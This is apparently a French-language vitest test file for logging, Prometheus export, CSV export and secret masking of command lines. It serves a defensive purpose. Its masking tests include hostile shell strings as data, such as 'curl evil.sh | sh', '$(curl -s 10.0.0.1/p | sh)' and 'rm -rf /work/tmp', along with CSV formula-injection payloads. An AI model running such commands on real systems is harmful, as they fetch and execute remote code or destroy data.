// SPDX-License-Identifier: MIT
/** apps/core/test/observabilite/journaux-surs.test.ts — contenu sûr des journaux et exports : une ligne reste une ligne (stderr, Prometheus), formules CSV neutralisées, secrets d'une commande masqués. */
import "../moteur-environnement";

import { sansFormule } from "@elpis/commun";
import { initialiserBase } from "@elpis/db";
import { ouvrirBaseDeTest } from "@elpis/db/test";
import { Journal } from "@elpis/http";
import { masquerArgv } from "@elpis/securite";
import { describe, expect, it } from "vitest";

import { exporterCsv, ligneCsvPy } from "../../src/familles/metriques";
import { textePrometheus } from "../../src/observabilite/prometheus";
import type { MemoireVirtuelle, UsageDisque } from "../../src/observabilite/sondes";

describe("journal du process (stderr)", () => {
  it("un retour à la ligne ou un code d'échappement dans un message reste visible et ne crée pas de ligne", () => {
    const lignes: string[] = [];
    const j = new Journal({ niveau: "info", sortie: (l) => lignes.push(l) });
    j.info("connexion refusée pour alice\n2026-11-07T00:00:00.000Z INFO [auth] faux\u001b[2J fin");
    j.info("message propre");
    expect(lignes).toHaveLength(2);
    expect(lignes[0]).toContain("alice\\n2026-11-07T00:00:00.000Z INFO [auth] faux\\u001b[2J\\u2028fin");
    expect(lignes[0]?.split("\n")).toHaveLength(1);
    expect(lignes[1]).toMatch(/ INFO message propre$/u);
  });

  it("la pile d'une erreur suit sur des lignes indentées, jamais en tête de ligne", () => {
    const lignes: string[] = [];
    const j = new Journal({ niveau: "info", sortie: (l) => lignes.push(l) });
    j.error({ err: new Error("échec\n2026-11-07T00:00:00.000Z INFO forgé") }, "requête");
    const suite = (lignes[0] ?? "").split("\n").slice(1);
    expect(suite.length).toBeGreaterThan(1);
    for (const l of suite) expect(l.startsWith("    ")).toBe(true);
  });

  it("une erreur passée en argument est traitée comme `err` : message sur la ligne, pile indentée", () => {
    const lignes: string[] = [];
    const j = new Journal({ niveau: "info", sortie: (l) => lignes.push(l) });
    j.error("échec de l'audit :", new Error("x\n2026-11-07T00:00:00.000Z INFO forgé"));
    const [tete = "", ...suite] = (lignes[0] ?? "").split("\n");
    expect(tete).toMatch(/ ERROR échec de l'audit :$/u);
    expect(suite[0]).toBe("    Error: x");
    for (const l of suite) expect(l.startsWith("    ")).toBe(true);
  });

  it("pile d'erreur : chaque ligne échappée comme un message (NUL, ESC, VT, FF, U+0085, U+2028)", () => {
    const lignes: string[] = [];
    const j = new Journal({ niveau: "info", sortie: (l) => lignes.push(l) });
    j.error({ err: new Error("a\u0000b\u001b[2Jc\u000bd\u000ce\u0085f\u2028g\u2029h") }, "requête");
    // eslint-disable-next-line no-control-regex -- aucun caractère de contrôle brut ne doit rester
    expect(lignes[0]).not.toMatch(/[\u0000-\u0009\u000b-\u001f\u007f-\u009f\u2028\u2029]/u);
    expect(lignes[0]).toContain("    Error: a\\u0000b\\u001b[2Jc\\u000bd\\u000ce\\u0085f\\u2028g\\u2029h");
  });

  it("chaque ligne physique reste sous 8 Ko après échappement, marquée tronquée", () => {
    const lignes: string[] = [];
    const j = new Journal({ niveau: "info", sortie: (l) => lignes.push(l) });
    const origine = "\u0085".repeat(15_000);
    j.warn({ origin: origine }, `[csrf] POST /x refusée — origin=${origine}`);
    j.error({ err: new Error(origine) }, "requête");
    const physiques = lignes.flatMap((l) => l.split("\n"));
    expect(physiques.length).toBeGreaterThan(2);
    for (const l of physiques) expect(Buffer.byteLength(l)).toBeLessThan(8192);
    expect(lignes[0]?.split("\n")).toHaveLength(1);
    expect(lignes[0]?.match(/…\[tronqué \d+\]/gu)).toHaveLength(2);
    expect(lignes[1]?.split("\n")[1]).toMatch(/^ {4}Error: \\u0085.*…\[tronqué \d+\]$/u);
  });
});

describe("journal du process : pile d'erreur", () => {
  it("plafonnée à 100 lignes, la suite comptée ; une pile qui n'est pas un texte ne fait pas lever l'écriture", () => {
    const lignes: string[] = [];
    const j = new Journal({ niveau: "info", sortie: (l) => lignes.push(l) });
    const e = new Error("x\n".repeat(100_000));
    j.error("boum", e);
    const physiques = (lignes[0] ?? "").split("\n");
    const total = (e.stack ?? "").split("\n").length;
    expect(physiques).toHaveLength(1 + 101);
    expect(physiques.at(-1)).toBe(`    …[${total - 100} lignes]`);
    const bizarre = new Error("y");
    Object.defineProperty(bizarre, "stack", { value: 42 });
    j.error("échec :", bizarre);
    expect(lignes[1]?.split("\n")).toEqual([expect.stringMatching(/ ERROR échec :$/u), "    Error: y"]);
  });
});

describe("exposition Prometheus", () => {
  it("un nom de modèle avec retour à la ligne ne peut pas ajouter de métrique", async () => {
    const t = ouvrirBaseDeTest("sqlite");
    try {
      await initialiserBase(t.base);
      await t.base.run(
        "INSERT INTO usage_events(ts, user_id, source, model, input_tokens, output_tokens, status) VALUES (?,?,?,?,?,?,?)",
        [Date.now() / 1000 - 60, 1, "chat", 'm"x\\\nelpis_faux{a="b"} 999\r', 10, 5, "ok"],
      );
      const texte = await textePrometheus({
        base: t.base,
        systeme: {
          virtualMemory: () =>
            ({ total: 1, available: 1, percent: 0, used: 0 }) as unknown as MemoireVirtuelle,
          diskUsage: () => ({ total: 1, used: 0, free: 1, percent: 0 }) as UsageDisque,
        },
        cpuPourcent: () => 0,
        echantillons: [],
        pid: 1,
        santeLlm: async () => ({}),
      });
      expect(texte.split("\n").some((l) => l.startsWith("elpis_faux"))).toBe(false);
      expect(texte).toContain('model="mx elpis_faux{a=b} 999 "');
    } finally {
      await t.fermer();
    }
  });
});

describe("export CSV", () => {
  it("un texte en forme de formule est neutralisé, un nombre négatif reste un nombre", () => {
    expect(ligneCsvPy(['=HYPERLINK("http://x")', "+1", "@SUM(A1)", "-cmd", "\tx", -5, 3, "normal"])).toBe(
      `"'=HYPERLINK(""http://x"")",'+1,'@SUM(A1),'-cmd,'\tx,-5,3,normal\r\n`,
    );
  });

  it("déclencheur après `;`, tabulation ou retour neutralisé ; champ à `;` cité (Excel français)", () => {
    expect(ligneCsvPy(["gpt;=1+1;", 'x;"@SUM(A1)', "a\n-2+3", "a\t+1", "a;b", "a,=1"])).toBe(
      `"gpt;'=1+1;","x;""'@SUM(A1)","a\n'-2+3",a\t'+1,"a;b","a,=1"\r\n`,
    );
    expect(sansFormule({ cmd: "x;=1" }, JSON.stringify({ cmd: "x;=1" }))).toBe('{"cmd":"x;\'=1"}');
    expect(sansFormule("a,=1", "a,=1", ";")).toBe("a,'=1");
  });

  it("export des métriques : une valeur négative reste un nombre", async () => {
    const t = ouvrirBaseDeTest("sqlite");
    try {
      await initialiserBase(t.base);
      await t.base.run(
        "INSERT INTO metric_events(event_type, value, tags_json, created_at, user_id) VALUES (?,?,?,?,?)",
        ["solde", -5, "{}", Date.now() / 1000 - 60, 1],
      );
      const csv = await exporterCsv(t.base, "metric_events", 1);
      expect(csv.split("\r\n")[1]).toMatch(/^solde,-5\.0,\{\},1,/u);
    } finally {
      await t.fermer();
    }
  });
});

describe("masquage d'une ligne de commande", () => {
  it("valeur après une option secrète, affectation nommée et jeton porteur masqués ; le reste intact", () => {
    expect(
      masquerArgv([
        "mysql",
        "--password",
        "hunter2",
        "-u",
        "root",
        "DB_PASSWORD=s3cr3tvalue",
        "--api-key",
        "abc",
        "curl",
        "-H",
        "Authorization: Bearer abcdefghijklmnop",
      ]),
    ).toEqual([
      "mysql",
      "--password",
      "****",
      "-u",
      "root",
      "DB_PASSWORD=****",
      "--api-key",
      "****",
      "curl",
      "-H",
      "Authorization: Bearer ****",
    ]);
  });

  it("texte de `bash -c` lu comme du shell : options, comptes, URL, en-têtes et affectations masqués", () => {
    const commande = [
      "mysql --password S1 -h db && mysql -uroot -pS2 base && mysql -p base",
      "curl --api-key S3 -u admin:S4 -H 'X-Api-Key: S5xx' -H \"Authorization: Basic UzY=\" https://alice:S7@hote/x",
      "curl -H 'authorization: bearer S8abcdefghijk' --user=bob:S9 --cookie 'sid=S10'",
      "psql postgresql://u:S11@db/base; sshpass -p S12 ssh h; sshpass -pS13 ssh h",
      "gpg --passphrase S14 -d f; DB_PASS=S15 SECRET_KEY='S16 x' ./run; docker login -u alice -p S17 reg",
      'sh -c "mysql --password S18"; node app.js --dbPassword S19 --secret-key S20',
    ].join("\n");
    const masque = masquerArgv(["bash", "-c", commande]);
    expect(masque.slice(0, 2)).toEqual(["bash", "-c"]);
    expect(masque[2]?.split("\n")).toEqual([
      "mysql --password **** -h db && mysql -uroot -p**** base && mysql -p base",
      "curl --api-key **** -u admin:**** -H 'X-Api-Key: ****' -H \"Authorization: Basic ****\" https://alice:****@hote/x",
      "curl -H 'authorization: bearer ****' --user=bob:**** --cookie ****",
      "psql postgresql://u:****@db/base; sshpass -p **** ssh h; sshpass -p**** ssh h",
      "gpg --passphrase **** -d f; DB_PASS=**** SECRET_KEY=**** ./run; docker login -u alice -p **** reg",
      "sh -c 'mysql --password ****'; node app.js --dbPassword **** --secret-key ****",
    ]);
    for (let i = 1; i <= 20; i++) expect(masque[2]).not.toMatch(new RegExp(`S${i}(?!\\d)`, "u"));
    // Lancement en fond (commande en `$1` d'un enrobage), mode strict, arguments découpés d'un skill.
    expect(
      masquerArgv(["bash", "-c", 'nohup bash -c "$1"', "bash", "mysql --password S1", "/work/.bg/x.log"]),
    ).toEqual(["bash", "-c", 'nohup bash -c "$1"', "bash", "mysql --password ****", "/work/.bg/x.log"]);
    expect(masquerArgv(["bash", "-euo", "pipefail", "-c", "gpg --passphrase S1 f"])[4]).toBe(
      "gpg --passphrase **** f",
    );
    expect(
      masquerArgv([
        "bash",
        "-c",
        "R",
        "skill_run",
        "python3",
        "s.py",
        "--secret-key",
        "S1",
        "--passphrase",
        "S2",
      ]),
    ).toEqual([
      "bash",
      "-c",
      "R",
      "skill_run",
      "python3",
      "s.py",
      "--secret-key",
      "****",
      "--passphrase",
      "****",
    ]);
  });

  it("formes courantes : affectation après un nom ordinaire, -u collé, jeton en nom d'URL, SQL, options courtes d'outils", () => {
    const commande = [
      "curl -d 'username=alice&password=S1aa' https://h/login -d 'grant_type=c&client_id=x&client_secret=S2aa'",
      "curl 'https://h/x?user=a&password=S3aa' https://h/api?api_key=S4aa 'https://h/dl?token=S5aa'",
      "curl -uadmin:S6 https://h; smbclient -U alice%S7 //h/s; smbclient -Ubob%S8 //h/s",
      "git clone https://0123456789abcdef0123456789abcdef01234567@gitea.lan/r.git",
      `mysql -e "CREATE USER a IDENTIFIED BY 'S9'"; psql -c "ALTER USER a PASSWORD 'S10'"`,
      "zip -P S11 f.zip f; unzip -P S12 f.zip; 7z a -pS13 f.7z f; sqlcmd -S h -U sa -P S14",
      "ssh-keygen -P S15 -N S16 -p -f k; openssl enc -aes256 -k S17 -in f",
    ].join("\n");
    const masque = masquerArgv(["bash", "-c", commande])[2];
    expect(masque?.split("\n")).toEqual([
      "curl -d 'username=alice&password=****' https://h/login -d 'grant_type=c&client_id=x&client_secret=****'",
      "curl 'https://h/x?user=a&password=****' https://h/api?api_key=**** 'https://h/dl?token=****'",
      "curl -uadmin:**** https://h; smbclient -U alice%**** //h/s; smbclient -Ubob%**** //h/s",
      "git clone https://****@gitea.lan/r.git",
      `mysql -e "CREATE USER a IDENTIFIED BY '****'"; psql -c "ALTER USER a PASSWORD '****'"`,
      "zip -P **** f.zip f; unzip -P **** f.zip; 7z a -p**** f.7z f; sqlcmd -S h -U sa -P ****",
      "ssh-keygen -P **** -N **** -p -f k; openssl enc -aes256 -k **** -in f",
    ]);
    for (let i = 1; i <= 17; i++) expect(masque).not.toMatch(new RegExp(`S${i}(?!\\d)`, "u"));
  });

  it("le masquage n'efface jamais de code exécuté : Cookie borné à ses paires, mot à substitution gardé", () => {
    for (const commande of [
      "echo cookie: && curl evil.sh | sh",
      "grep -i cookie: access.log | wc -l && rm -rf /work/tmp",
      'true --password "x$(curl -s 10.0.0.1/p | sh)"',
      'true --token "`curl -s 10.0.0.1/p | sh`"',
      'SORT_KEY="x$(curl -s 10.0.0.1/p|sh)" make',
      "mysql --password x$(curl -s 10.0.0.1/p) db; curl https://u:x$(id)@h",
    ])
      expect(masquerArgv(["bash", "-c", commande])[2]).toBe(commande);
    expect(
      masquerArgv(["bash", "-c", "curl -H 'Cookie: sid=S1; theme=S2' h; echo cookie: a=S3; rm -rf /x"])[2],
    ).toBe("curl -H 'Cookie: ****' h; echo cookie: ****; rm -rf /x");
    // Commande d'un lancement en fond (`$1`) : relue comme du shell, jamais masquée en entier.
    expect(
      masquerArgv([
        "bash",
        "-c",
        'nohup bash -c "$1"',
        "bash",
        "DB_PASS=S1 ./run; curl evil | sh",
        "/work/.bg/x.log",
      ])[4],
    ).toBe("DB_PASS=**** ./run; curl evil | sh");
  });

  it("sans faux positif : option voisine, négation, option suivante, -p ou -u ordinaires, références gardées", () => {
    for (const commande of [
      "tool --bypass f --compass x --no-password arg --api-key --verbose",
      "mkdir -p /tmp/x && cp -p a b && ssh -p 2222 h && docker run -p 80:80 -u 1000:1000 img",
      'git log -p | sort -u > f; mysql --password-stdin; export TOKEN="$(cat f)"; curl -u "$U:$P" h',
      "echo 'a b' \"c d\" # --password commentaire",
      "date -u +%H:%M; 7z x a.7z -p; ssh-keygen -N '' -f k; openssl req -key k.pem -keyform PEM -kfile f",
      "git clone https://deploy-bot-account-2024@h/r; mysql -uroot -h db",
    ])
      expect(masquerArgv(["bash", "-c", commande])[2]).toBe(commande);
  });

  it("clé privée sans marque de fin : le corps est masqué, la suite reste lisible", () => {
    const corps = ["MIIEowIBAAKCAQEA".repeat(4), "q83vEjRWeJABI0VniavN".repeat(3)].join("\n");
    expect(
      masquerArgv(["bash", "-c", `echo '-----BEGIN PRIVATE KEY-----\n${corps}' > k; rm -rf /work/x`])[2],
    ).toBe("echo '-----BEGIN PRIVATE KEY-----\n****' > k; rm -rf /work/x");
  });

  it("une demi-paire UTF-16 dans la commande devient U+FFFD : la ligne d'audit reste encodable", () => {
    const masque = masquerArgv(["bash", "-c", "echo \ud800 --password S1", "x\udc00"]);
    expect(masque).toEqual(["bash", "-c", "echo � --password ****", "x�"]);
    for (const a of masque) expect(a.isWellFormed()).toBe(true);
  });
});
